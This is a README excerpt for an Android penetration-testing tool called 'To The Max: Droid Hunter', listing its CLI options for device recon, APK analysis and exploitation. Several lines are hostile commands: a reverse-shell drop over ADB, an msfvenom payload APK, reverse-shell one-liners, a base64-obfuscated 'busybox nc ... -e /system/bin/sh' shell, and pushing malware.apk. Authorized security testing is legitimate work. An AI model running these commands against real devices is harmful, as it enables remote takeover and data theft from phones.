...
![To The Max: Droid Hunter Preview](assets/To-The-Max-Droid-Hunter-preview.png)

> Add your screenshot as `assets/To-The-Max-Droid-Hunter-preview.png`.
...
cd /path/to/To-The-Max-Droid-Hunter
# or
git clone https://github.com/japost1985/To-The-Max-Droid-Hunter.git
...
```bash
python3 To-The-Max-Droid-Hunter.py
# or
python3 To-The-Max-Droid-Hunter.py --interactive
```

The interactive Remote Control menu supports **Open Remote Screen** through `scrcpy` for Android screen mirroring.

To The Max: Droid Hunter supports both **Manual ADB WiFi Connect** and **Auto ADB WiFi Connect** from the interactive menu. Auto ADB WiFi Connect requires the phone to be connected by USB first, USB Debugging enabled, and both devices on the same WiFi network.

### CLI Mode
```bash
# List connected devices
python3 To-The-Max-Droid-Hunter.py --devices

# Full device info
python3 To-The-Max-Droid-Hunter.py --device ABC123 --info

# Analyze APK + generate HTML report
python3 To-The-Max-Droid-Hunter.py --apk target.apk --report html --target-name "com.example.app"

# Port scan device
python3 To-The-Max-Droid-Hunter.py --device ABC123 --port-scan

# Full vulnerability scan
python3 To-The-Max-Droid-Hunter.py --device ABC123 --vuln-scan --pkg com.example.app

# Check for CVEs based on Android version
python3 To-The-Max-Droid-Hunter.py --device ABC123 --cve-check

# Check if device is rooted
python3 To-The-Max-Droid-Hunter.py --device ABC123 --root-check

# Capture logcat (200 lines)
python3 To-The-Max-Droid-Hunter.py --device ABC123 --logcat 200

# Capture screenshot
python3 To-The-Max-Droid-Hunter.py --device ABC123 --screenshot

# Enable ADB over WiFi
python3 To-The-Max-Droid-Hunter.py --device ABC123 --adb-wifi

# WiFi info
python3 To-The-Max-Droid-Hunter.py --device ABC123 --wifi-info

# SSL pinning check
python3 To-The-Max-Droid-Hunter.py --device ABC123 --ssl-pinning com.example.app

# MitM proxy setup guide
python3 To-The-Max-Droid-Hunter.py --mitm-guide

# Launch exported activity
python3 To-The-Max-Droid-Hunter.py --device ABC123 --exploit activity \
  --pkg com.example.app --activity com.example.app.DebugActivity

# Deep link fuzzer
python3 To-The-Max-Droid-Hunter.py --device ABC123 --exploit deep-link \
  --pkg com.example.app --scheme myapp

# Drop reverse shell via ADB
python3 To-The-Max-Droid-Hunter.py --device ABC123 --exploit shell-drop \
  --lhost 192.168.1.100 --lport 4444

# Generate msfvenom APK payload
python3 To-The-Max-Droid-Hunter.py --payload reverse_tcp \
  --lhost 192.168.1.100 --lport 4444 --payload-out evil.apk

# Generate reverse shell one-liners
python3 To-The-Max-Droid-Hunter.py --payload reverse-shells \
  --lhost 192.168.1.100 --lport 4444

# Obfuscate a command
python3 To-The-Max-Droid-Hunter.py --payload obfuscate \
  --raw-payload "busybox nc 10.0.0.1 4444 -e /system/bin/sh" \
  --obfuscate-method base64

# Pull file from device
python3 To-The-Max-Droid-Hunter.py --device ABC123 --pull /sdcard/secret.txt

# Push file to device
python3 To-The-Max-Droid-Hunter.py --device ABC123 --push malware.apk /sdcard/malware.apk

# Discover live hosts on subnet
python3 To-The-Max-Droid-Hunter.py --discover 192.168.1

# Generate JSON + HTML report
python3 To-The-Max-Droid-Hunter.py --apk app.apk --device ABC123 --vuln-scan \
...
To The Max: Droid Hunter generates:
...
> To The Max: Droid Hunter is intended **exclusively** for authorized security assessments, CTF competitions, and educational research.
>
...
>
> The author **japost1985** and contributors assume **no liability** for any misuse or damage caused by this tool.

---

<div align="center">
  Made by <strong>japost1985</strong> | To The Max: Tech
</div>
